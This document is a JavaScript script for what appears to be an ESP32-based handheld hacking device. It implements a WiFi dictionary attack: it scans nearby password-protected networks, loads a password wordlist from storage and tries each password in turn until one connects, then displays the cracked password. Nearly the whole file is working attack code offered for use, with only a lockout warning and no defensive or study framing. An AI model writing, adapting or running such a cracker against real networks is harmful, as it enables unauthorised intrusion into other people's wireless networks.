var dialog = require('dialog');
var wifi = require('wifi');
var storage = require('storage');
var keyboard = require('keyboard');
var display = require('display');
var serial = require('serial');

var dialogMessage = dialog.info;
var dialogChoice = dialog.choice;
var dialogError = dialog.error;

var wifiScan = wifi.scan;
var wifiConnect = wifi.connect;
var wifiDisconnect = wifi.disconnect;

var fillScreen = display.fill;

var serialPrintln = serial.println;

// Wifi dictionary-based attacker
// use at your own risk, some devices may lock you out as a security mechanism when spammed with this!

function wifiDictAttack(ssid, pwds) {
  var connected = false;
  // iterate over the passwords
  for( var i=0; i<pwds.length; i++ ) {
      if(!pwds[i].trim()) continue;  // skip empty lines
      serialPrintln("Trying password for " + ssid + ": " + pwds[i]);
      dialogMessage("Trying pwd " + (i+1) + "/" + pwds.length);
      connected = wifiConnect(ssid, 3, pwds[i]);  // timeout is 3s
      if(connected) {
        serialPrintln("Password found for " + ssid + ": " + pwds[i]);
        dialogMessage("Pwd found: " + pwds[i], true);
        return;
      }
      delay(10);  // yield to avoid watchdog reset
      if(keyboard.getEscPress()) break;  // user abort
    }
  dialogError("Pwd not found", true);
}

var network_to_attack_ssid = "";
var passwords_to_try_arr = [];

while(true)
{
  var menu_options = {};
  menu_options["Select AP"] = "scan";
  menu_options["Load dict"] = "load";
  menu_options["Start attack"] = "attack";

  var choice = dialogChoice(menu_options);

  if(choice=="") {
    break;  // quit
  }
  if(choice=="scan") {
    dialogMessage("Scanning..");
    var networks = wifiScan();
    delay(10000);

    if(!networks.length) {
      dialogError("no wifi networks found!");
      continue;
    }
    var networks_choices = {};
    var shown = 0;
    for (var i = 0; i < networks.length; i++) {
      var net = networks[i];
      // every password-protected network, so WPA2/WPA3 mixed ones are listed too
      if (net.encryptionType != "OPEN" && net.encryptionType.indexOf("ENTERPRISE") < 0) {
        var label = net.SSID + " (" + net.RSSI + " dBm) " + net.encryptionType + " [" + net.MAC + "]";
        networks_choices[label] = net.SSID;  // chave visível, valor retornado
        shown++;
      }
    }
    if (shown == 0) {
      dialogError("no password networks found");
      continue;
    }
    network_to_attack_ssid = dialogChoice(networks_choices);
  }
  else if(choice=="load") {
    var passwords_file = dialog.pickFile("/");
    if(!passwords_file) continue;
    var passwords_to_try = "";
    try {
      passwords_to_try = storage.read(passwords_file);
    } catch (e) {
      dialogError("could not read that file");
      continue;
    }
    if(!passwords_to_try) continue;
    var raw_passwords = passwords_to_try.split("\n");
    passwords_to_try_arr = [];
    for (var i = 0; i < raw_passwords.length; i++) {
      var pwd = raw_passwords[i].trim();  // trim also removes the \r from Windows line endings
      if (pwd) {
        passwords_to_try_arr.push(pwd);
      }
    }
    dialogMessage("loaded " + passwords_to_try_arr.length + " passwords", true);
  }
  else if(choice=="attack") {
    if(!network_to_attack_ssid) {
      dialogError("no wifi network selected, pls rescan");
      continue;
    }
    if(passwords_to_try_arr.length == 0) {
      dialogError("no passwords dict loaded");
      continue;
    }
    //print("trying attacking network " + networks[i].SSID + " " + networks[i].MAC);
    dialogMessage("Attacking..");

    keyboard.setLongPress(true);
    wifiDictAttack(network_to_attack_ssid, passwords_to_try_arr);
    keyboard.setLongPress(false);

    wifiDisconnect();  // avoid automatic reconnection retry to the last network
  } // end if attack

  fillScreen(0); // clear screen
}


// 2FIX: tries to reconnect? https://github.com/espressif/arduino-esp32/issues/7968

